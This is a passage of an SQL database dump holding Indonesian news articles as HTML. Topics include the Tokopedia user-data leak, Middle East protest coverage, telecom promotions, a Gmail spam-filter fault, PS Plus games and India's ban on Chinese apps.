sudah tidak aktif, alias menghilang,\" kata Pratama lewat pesan singkat.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><b>Tanggapan Tokopedia </b></span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Lewat pernyataan tertulis, VP of Corporate Communications Tokopedia, Nuraini Razak, mengatakan pihaknya telah mengetahui adanya penyebaran informasi secara ilegal di media sosial dan forum internet terkait data pelanggannya yang dicuri. </span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Kami telah melaporkan hal ini ke pihak kepolisian dan juga mengingatkan seluruh pihak untuk menghapus segala informasi yang memfasilitasi akses ke data yang diperoleh melalui cara yang melanggar hukum,\" ujar Nuraini.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dia menegaskan bahwa ini bukanlah upaya pencurian data baru dan informasi password pengguna Tokopedia tetap aman terlindungi di balik enkripsi.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Meski demikian, Pratama mengatakan bahwa, apabila data tersebut jatuh ke tangan hacker yang ahli melakukan cracking hash, maka password bisa saja diketahui dan selanjutnya dapat terjadi pengambilalihan akun. </span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam pesan singkatnya, Pratama menyayangkan Tokopedia yang dinilainya kurang serius dalam menangani persoalan sekuriti. </span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Selain itu, menurut dia, tanpa aturan yang tegas, setiap penyelenggara sistem elektronik baik negara maupun swasta tidak mendapat tekanan untuk membuat sistem dan maintenance terbaik.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">“Adanya 91 juta data (pengguna Tokopedia) yang bocor ini membuktikan betapa lemahnya regulasi perundang-undangan kita yang menaungi wilayah siber dan data pribadi. Sekali lagi, RUU Perlindungan Data Pribadi harus segera diselesaikan,\" ujar Pratama.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>', 'Bocoran Data 91 Juta Pengguna Tokopedia Beredar lewat Link di Social Media Facebook', 'Jumat', '2020-07-07', '09:51:42', 'tokopedia_multicom.jpg', 25, 'palestina', 'Y'),
(657, 47, 'admin', 'Unjuk Rasa Anti-Yahudi Dikecam Eropa dan Dunia', '', '', 'unjuk-rasa-antiyahudi-dikecam-eropa-dan-dunia', 'N', 'Y', 'Y', '<p><strong>PARIS&nbsp;</strong>- Demo anti-Yahudi yang menyeruak di dunia mendapat kecaman dari negara besar di Eropa. Kecaman tersebut datang dari Jerman, Prancis dan Italia.<br />\r\n<br />\r\nMelalui menteri luar negerinya, masing-masing negara mengutuk aksi unjuk rasa yang sering berujung dengan kericuhan dan tindak kekerasan.<br />\r\n<br />\r\n&quot;Hasutan, permusuhan, serangan terhadap orang-orang Yahudi tidak memiliki tempat di masyarakat kami,&quot;&nbsp; sebut pernyataan gabungan tiga Menlu tersebut, seperti dikutip dari&nbsp;<em>DNA</em>, Rabu (23/7/2014).<br />\r\n<br />\r\nTidak bisa dipungkiri sejak agresi Israel dilancarkan, protes besar terjadi di beberapa negara. Di Prancis, unjuk rasa kelompok Pro-Palestina diakhiri pembakaran di sejumlah objek di depan toko yang dimiliki warga Yahudi.<br />\r\n<br />\r\nBahkan di negara ini, akibat memanasnya kondisi di Gaza, ketegangan antara kelompok Pro-Palestina dan warga Yahudi di Prancis acap kali terjadi. Prancis sendiri merupakan negara dengan populasi warga Yahudi terbanyak di Eropa.<br />\r\n<br />\r\nTidak hanya di Prancis, kondisi di Gaza pun jauh lebih buruk. Akibat pertempuran Hamas-Israel jumlah korban, khususnya dari warga sipil Palestina mencapai hampir 600 orang.</p>\r\n', '', 'Rabu', '2014-07-23', '14:37:32', '', 8, 'yahudi,israel,palestina,internasional', 'Y'),
(658, 47, 'admin', 'Inggris Bela Serangan Roket Hamas ke israel', '', '', 'inggris-bela-serangan-roket-hamas-ke-israel', 'N', 'Y', 'Y', '<p>LONDON - Seorang anggota Parlemen Inggris membela serangan roket yang dilesakkan oleh Hamas ke arah Israel. Namun pembelaannya itu diganjar dengan sanksi indisipliner terhadapnya.</p>\r\n\r\n<p>Anggota Parlemen Inggris dari Partai Liberal Demokrat, David Ward, lewat akun Twitter miliknya menulis pernyataan yang membela serangan roket dari Hamas.</p>\r\n\r\n<p>&quot;The big question is - if I lived in #Gaza would I fire a rocket? - probably yes. &#39;Pertanyaan besar saat ini, apabila saya tinggal di #Gaza apakah saya akan menembakkan roket? mungkin saja iya&#39;,&quot; tulis Ward dalam akun pribadinya, seperti dikutip The Guardian, Rabu (23/7/2014).</p>\r\n\r\n<p>Pihak Partai Liberal Demokrat pun langsung melontarkan kecaman atas tulisan dari Ward. Juru bicara partai mengatakan bahwa pihak partainya akan menerapkan sanksi terhadap Ward.</p>\r\n\r\n<p>Sementara pihak Partai Konservatif yang menguasai koalisi pemerintahan bersama Liberal Demokrat menyatakan Ward harus menarik komentarnya.</p>\r\n\r\n<p>&quot;Tidak seharusnya seorang anggota parlemen menulis tindakan yang memicu kekerasan. Tindakannya tidak bertanggung jawab,&quot; ucap pihak Konservatif.</p>\r\n\r\n<p>Ini bukan pertama kalinya Ward mengecam tindakan Israel. Pada Juli 2013 lalu, Ward menyebut pihak Zionis diambang kekalahan dalam perang. Dirinya pun mempertanyakan sampai kapan negara apartheid seperti Israel bisa bertahan.</p>\r\n', '', 'Minggu', '2018-04-22', '11:15:29', 'hamas_inggris.jpg', 10, 'yahudi,israel,palestina,internasional,hukum', 'Y');
INSERT INTO `berita` (`id_berita`, `id_kategori`, `username`, `judul`, `sub_judul`, `youtube`, `judul_seo`, `headline`, `aktif`, `utama`, `isi_berita`, `keterangan_gambar`, `hari`, `tanggal`, `jam`, `gambar`, `dibaca`, `tag`, `status`) VALUES
(659, 39, 'admin', 'Bayar Langganan Tinder Plus Kini Bisa Pakai Pulsa Telkomsel', '', 'https://youtu.be/0cTAxUg_27I', 'bayar-langganan-tinder-plus-kini-bisa-pakai-pulsa-telkomsel', 'N', 'Y', 'Y', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Menjalin kerja sama dengan aplikasi Tinder, operator seluler Telkomsel kini memberikan kemudahan bagi para pelanggannya yang ingin melakukan transaksi pada fitur premium Tinder. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pelanggan Telkomsel kini dapat membayar biaya berlangganan Tinder Plus menggunakan pulsa ataupun pascabayar melalui tagihan KartuHalo. Tinder Plus sendiri merupakan salah satu jenis keanggotaan premium pada aplikasi Tinder, selain Tinder Gold.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dengan berlangganan Tinder Plus, pelanggan bisa mendapatkan benefit berupa jumlah likes yang tidak terbatas, fitur Rewind, lima Super Likes setiap harinya, satu Boost setiap bulan, dan Passport. Selain itu, pelanggan Tinder Plus juga tidak akan diganggu oleh iklan.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pelanggan juga bisa mendapatkan voucher berlangganan Tinder Plus melalui aplikasi Dunia Games dan Upoint ID yang tersedia secara gratis di Google Play Store serta App Store atau melalui situs resmi duniagames.co.id dan upoint.id. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Head of Digital Lifestyle Telkomsel Crispin P. Tristram mengatakan, kerja sama dengan Tinder ini merupakan salah satu wujud upaya Telkomsel mengembangkan produk dan layanannya untuk memenuhi kebutuhan para pelanggan.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> \"Kami menyambut baik kolaborasi dengan Tinder untuk memenuhi kebutuhan pelanggan akan aplikasi penunjang gaya hidup digital saat ini,\" ujar Crispin dalam keterangan tertulis yang diterima KompasTekno, Minggu (21/6/2020).</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Crispin juga menyebut, kolaborasi ini diharapkan mampu memberikan pelayanan ekstra bagi pelanggannya yang kini sudah melebihi 110 juta orang.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Melalui platform unit bisnis Dunia Games, kami akan terus berupaya untuk memenuhi kebutuhan akses ragam platform hiburan digital pelanggan,\" lanjut Tristram.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Sementara itu, Match Group selaku pemilik Tinder mengatakan bahwa Tinder kini memiliki sekitar 6 juta pelanggan secara global. Indonesia, menurut&nbsp;V.P. Business Development Match Group, Gaurav Girotra, adalah salah satu pasar terbesar Tinder di Asia Tenggara. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Kemitraan dengan Telkomsel ini akan memungkinkan kami untuk menawarkan kepada orang dewasa muda di Indonesia cara menarik untuk mengeksplorasi pengalaman sosial baru di Tinder,\" ujar Girotra.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Bayar Langganan Tinder Plus Kini Bisa Pakai Pulsa Telkomsel Indonesia', 'Minggu', '2020-07-07', '13:14:45', 'tinder_mstore_indonesia.jpg', 17, 'palestina', 'Y'),
(660, 39, 'admin', 'Tri Tawarkan Cashback Rp 10.000 Selama Tiga Bulan untuk Pelanggan Baru', '', 'https://youtu.be/ifIVKGjqa8g', 'tri-tawarkan-cashback-rp-10000-selama-tiga-bulan-untuk-pelanggan-baru', 'N', 'Y', 'Y', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Kebutuhan penggunaan internet diprediksi masih akan menjadi prioritas di tengah pandemi Covid-19, khususnya dalam menghadapi era kenormalan baru (new normal). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Untuk menyiasati hal tersebut, operator seluler Hutchison 3 ( Tri) Indonesia menawarkan program \" Cashback Beruntun\".</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Seperti namanya, program ini memungkinkan pengguna untuk mendapatkan cashback selama tiga bulan berturut-turut ketika mereka mengisi pulsa. Namun, program ini hanya berlaku untuk pengguna baru.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> “Untuk membantu mengantisipasi kebutuhan internet saat new normal, Tri Indonesia meluncurkan program \'Cashback Beruntun\' khusus untuk pengguna baru,\" ujar Chief Commercial Officer 3 Indonesia, Dolly Susanto, dalam keterangan tertulis yang diterima KompasTekno, Selasa (23/6/2020).</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dolly melanjutkan, pengguna yang baru saja mengaktifkan nomor Tri akan mendapatkan cashback senilai Rp 10.000 apabila mereka mengisi pulsa minimal Rp 10.000 di bulan yang sama.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Cashback tersebut akan dibagikan dalam dua tahap melalui kode voucher yang dikirimkan lewat SMS. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kedua voucher tersebut masing-masing bernilai Rp 5.000 dan akan diterima sesaat setelah mengisi pulsa. Kemudian, pengguna akan kembali menerima voucher sebesar Rp 5.000 sebulan setelahnya.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Nantinya, voucher tersebut bisa ditukar kembali dengan pulsa dengan cara membalas SMS yang berisikan kode tadi dengan serangkaian kata kunci (keyword).</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Promo cashback ini hanya berlaku untuk pengguna baru Kartu Perdana AlwaysOn yang melakukan aktivasi dan registrasi saat periode promo berjalan yakni mulai 11 Juni 2020 hingga 10 Oktober 2020.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Program cashback ini dapat dinikmati di bulan kedua dan ketiga sejak melakukan aktivasi dengan mengulangi mekanisme yang sama. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pulsa yang didapat dari program tersebut juga dapat digunakan untuk membeli kuota, dipakai untuk melakukan panggilan telepon, dan mengirim SMS.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Informasi lebih lanjut mengenai ketentuan dan syarat program tersebut dapat dilihat di tautan berikut, aplikasi bima+, atau menghubungi akun Twitter @3CareIndonesia.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Tri Tawarkan Cashback Rp 10.000 Selama Tiga Bulan untuk Pelanggan Baru di masa New Normal', 'Minggu', '2020-07-07', '11:13:58', 'tri-mstore-indonesia.png', 8, 'palestina', 'Y'),
(661, 39, 'admin', 'E-mail dan Nomor Ponsel Pengguna Tokopedia Beredar di Medsos, Ini Bahayanya', '', 'https://youtu.be/76KaoTtTdSU', 'email-dan-nomor-ponsel-pengguna-tokopedia-beredar-di-medsos-ini-bahayanya', 'N', 'Y', 'Y', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Setelah sempat dijual di internet, bocoran data 91 juta pengguna Tokopedia muncul lewat link unduhan di sebuah grup Facebook. Bocoran data ini antara lain berisi informasi e-mail, nama lengkap, dan nomor ponsel puluhan juta pengguna tersebut.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Lewat pernyataan tertulis, pihak Tokopedia menegaskan bahwa informasi password pengguna dilindungi dengan enkripsi, sehingga sulit dibuka oleh pihak lain, kalaupun bocor.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Kami telah melaporkan hal ini ke pihak kepolisian dan juga mengingatkan seluruh pihak untuk menghapus segala informasi yang memfasilitasi akses ke data yang diperoleh melalui cara yang melanggar hukum,\" ujar VP of Corporate Communications Tokopedia Nuraini Razak. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Meski demikian, Chairman Lembaga Riset Siber Indonesia Communication and Information System Security Research Center (CISSReC) Pratama Persadha mengatakan bahwa nomor ponsel, nama, dan e-mail yang kadung bocor juga dapat digunakan untuk tindak kejahatan. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pratama mencontohkan kejahatan phising atau scam. Dengan informasi nama dan nomor ponsel/e-mail, seseorang menghubungi korban dengan mengaku sebagai pihak Tokopedia, kemudian meminta uang atau coba mendapatkan informasi sensitif seperti password. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Lebih dari itu, nomor-nomor tersebut sangat rentan disalahgunakan untuk tindak kejahatan serius dan berdampak luas, seperti menyebarkan hoaks,\" ujar Pratama kepada KompasTekno lewat pesan singkat, Minggu (5/7/2020).</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Informasi nama, e-mail, dan nomor telepon yang valid, lanjut dia, juga memudahkan pelaku kriminal siber dalam melakukan profiling. Misalnya, dari nama bisa diketahui informasi seperti suku dan agama. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Lalu dengan e-mail dan nomor yang ada pelaku bisa melakukan pengiriman konten yang ditujukan, misalnya untuk provokasi tertentu. Hal semacam ini tentu sangat berbahaya,\" imbuh Pratama. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pentingnya RUU Perlindungan Data Pribadi, Kebocoran data puluhan juta penggunanya ini, menurut Pratama, menunjukkan bahwa Tokopedia memang benar-benar sudah diretas, bukan sekadar mengalami upaya peretasan saja. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dia menyayangkan lemahnya regulasi perundang-undangan Indonesia yang menaungi wilayah siber dan data pribadi. Tanpa aturan yang tegas, tak ada tekanan bagi penyelenggara sistem elektronik, baik negara maupun swasta, untuk membuat sistem dan maintenance terbaik.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Pratama menyebut General Data Protection Regulation (GDPR) sebagai contoh regulasi tentang teknologi apa yang harus diaplikasikan untuk menjaga </span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">keamanan data. Kalau ada kelalaian yang mengakibatkan kebocoran, maka penyelenggara dapat dikenakan denda.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Ketiadaan aturan serupa di Indonesa, lanjut dia, membuat masyarakat tidak memiliki perlindungan keamanan siber yang memadai. Penyelenggara sistem transaksi elektronik juga sulit dimintai tanggung jawab. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Karena itu, harus menjadi perhatian serius negara. Hal semacam ini terulang lagi, akan membuat Indonesia kehilangan kepercayaan internasional, lalu secara langsung menurunkan minat investasi asing,\" tandas Pratama.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>', 'E-mail dan Nomor Ponsel Pengguna Tokopedia Beredar di Medsos', 'Minggu', '2020-07-07', '11:13:08', 'tokopedia_mstore.jpg', 16, 'palestina', 'Y'),
(662, 39, 'admin', 'Pengguna Gmail Kebanjiran E-mail Sampah, Ini Sebabnya', '', 'https://youtu.be/6HL-duqAOxc', 'pengguna-gmail-kebanjiran-email-sampah-ini-sebabnya', 'N', 'Y', 'Y', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Pengguna layanan Gmail mengeluh kebanjiran e-mail \"sampah\" di folder inbox utamanya. Padahal, beragam e-mail tersebut seharusnya masuk ke kotak inbox khusus yang berlabel \" Spam\". </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sebagian besar keluhan berasal dari pengguna Gmail di kawasan Eropa, namun ada juga beberapa pengguna di luar wilayah tersebut. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Salah satu pengguna yang dilanda masalah tersebut adalah perintis platform pembuat software Makerpad.co, Ben Tossel. Ia mengaku bahwa inbox Gmail-nya telah dijejali dengan sejumlah e-mail sampah.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Tak hanya di Twitter, beberapa pengguna juga melaporkan masalah ini di forum Reddit. Salah satu pengguna dengan username kabonk melaporkan bahwa ia kotak masuknya \"diserang\" oleh aneka e-mail sampah. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Saya menerima semua jenis e-mail spam di kotak masuk utama saya nyaris hampir setiap beberapa menit,\" kata kabonk.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Usut punya usut, hal ini disebabkan oleh filter penyarin e-mail spam di layanan Gmail sempat rusak. Google mengklaim telah memperbaiki fitur penyaring (filter) e-mail sampah (spam) tersebut.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Kami telah mengidentifikasi dan memperbaiki sejumlah masalah di mana beberapa pengguna menerima e-mail berjenis spam dan promotional di kotak masuk utama (primary inbox) mereka,\" ujar Google dikutip KompasTekno dari AndroidPolice, Selasa (7/7/2020). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Meski demikian, Google mengonfirmasi bahwa pengguna sejatinya tidak perlu khawatir. Sebab, pada saat masalah tersebut muncul, fitur pemindaian (scan) potensi malware di dalam e-mail masih berfungsi dengan normal. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Selain itu, pengguna juga masih dilindungi dengan beberapa fitur keamanan Gmail lainnya seperti perlindungan dari beragam tautan jahat (phishing), fitur pemindai lampiran (attachment), dan lain sebagainya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Google juga memastikan bahwa tidak ada akun yang terdampak (diretas) akibat rusaknya spam filter di Gmail ini.</span><br></p>\r\n', 'Pengguna Gmail Kebanjiran E-mail Sampah', 'Minggu', '2020-07-07', '11:12:16', 'gmail.jpg', 14, 'palestina', 'Y'),
(664, 23, 'mstore', 'Inilah 5 Game PS Plus yang Paling Banyak Diunduh Satu Dekade Terakhir', '', 'https://www.youtube.com/watch?v=lS-S1EBW1o4', 'inilah-5-game-ps-plus-yang-paling-banyak-diunduh-satu-dekade-terakhir', 'N', 'Y', 'Y', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Selain mengumumkan tiga game gratis untuk bulan Juli, Sony juga mengumumkan daftar sejumlah game eksklusif PS Plus yang paling banyak diunduh selama 10 tahun terakhir. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Diketahui, sejak 29 Juni 2010 hingga 31 Maret 2020, Sony sendiri sudah menawarkan lebih dari 1.000 game kepada sekitar 41,5 juta pelanggan PS Plus yang bisa diunduh secara cuma-cuma.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Nah, dari angka ribuan itu, ada lima game PS4 yang diklaim paling banyak di-download oleh pelanggan PS Plus terhitung April 2020. Kelima game tersebut secara berurutan (dari posisi nomor satu) adalah Call of Duty: Modern Warfare Remastered, Sonic Forces, Shadow of The Colossus, Call of Duty: Black Ops III, dan Destiny 2.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Meski demikian, pihak Sony tidak mengungkap berapa jumlah unduhan untuk masing-masing game tersebut. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Namun, menarik jika melihat Sonic Forces yang mejeng di urutan kedua sebagai game PS Plus yang paling banyak diunduh, diikuti dengan Shadow of The Colossus. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">DIketahui, keduanya merupakan game PS Plus yang dirilis pada Maret 2020 lalu, berbeda dengan Call of Duty: Black Ops III dan Destiny 2 yang dirilis September 2018. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Hal tersebut bisa dikatakan wajar, karena berdasarkan data lembaga riset Statista, pengguna PS Plus per Desember 2018 tercatat mencapai 36,3 juta, selisih beberapa juta dibanding jumlah pengguna per akhir Maret 2020. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sehingga, selisih jumlah pengguna ini juga berkontribusi terhadap jumlah unduhan. Karena, game yang ada di PS Plus hanya bisa diklaim dalam periode waktu tertentu. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Call of Duty: Modern Warfare Remastered sendiri memang merupakan salah satu game legendaris dari franchise Call of Duty yang menjadi game gratis PS Plus di bulan Maret 2019. Versi orisinalnya sempat dirilis pada 2007 lalu untuk platform PC, PS3, dan Xbox 360. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dengan kata lain, tak aneh jika game tersebut mejeng di posisi teratas dalam daftar game PS Plus yang paling banyak di-download.&nbsp; </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Di samping lima game yang paling banyak diunduh, Sony juga mengumumkan lima game multiplayer (online) yang paling banyak dimainkan oleh pengguna PS Plus. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Mereka adalah Grand Theft Auto 5 (GTA V), Tom Clancy\'s: Rainbow Six Siege, Call of Duty: Black Ops III, Destiny, dan Call of Duty: Black Ops IV, sebagaimana dihimpun KompasTekno dari Ladbible, Jumat (3/7/2020).</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span></p>\r\n', 'Inilah 5 Game PS Plus yang Paling Banyak Diunduh Satu Dekade Terakhir, Yuk Cobain Gamenya!', 'Minggu', '2020-07-07', '17:10:47', 'game_mstore_indonesia.jpg', 9, 'selebritis', 'Y'),
(665, 23, 'mstore', 'TikTok dan Mobile Legends Diblokir Pemerintah India, Mengapa?', '', 'https://www.youtube.com/watch?v=zGWkwq90VQA', 'tiktok-dan-mobile-legends-diblokir-pemerintah-india-mengapa', 'N', 'Y', 'Y', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Aplikasi yang kini tengah naik daun, TikTok, tak lagi bisa digunakan di India. Sebab, pemerintah India memutuskan memblokir 59 aplikasi asal China yang beredar di negara tersebut. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Keputusan ini diambil setelah konflik yang terjadi di wilayah Ladakh, perbatasan antara China dan India menjadi semakin panas. Tercatat sekitar 20 tentara India tewas setelah bentrok dengan tentara China. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Selain TikTok, beberapa di antaranya juga merupakan aplikasi yang tergolong populer, seperti WeChat, hingga game Mobile Legends. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Menurut pemerintah India, puluhan aplikasi ini dinilai telah menimbulkan kekhawatiran dari serta berpotensi mengancam keamanan data negara. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Tim Tanggap Darurat telah menerima banyak 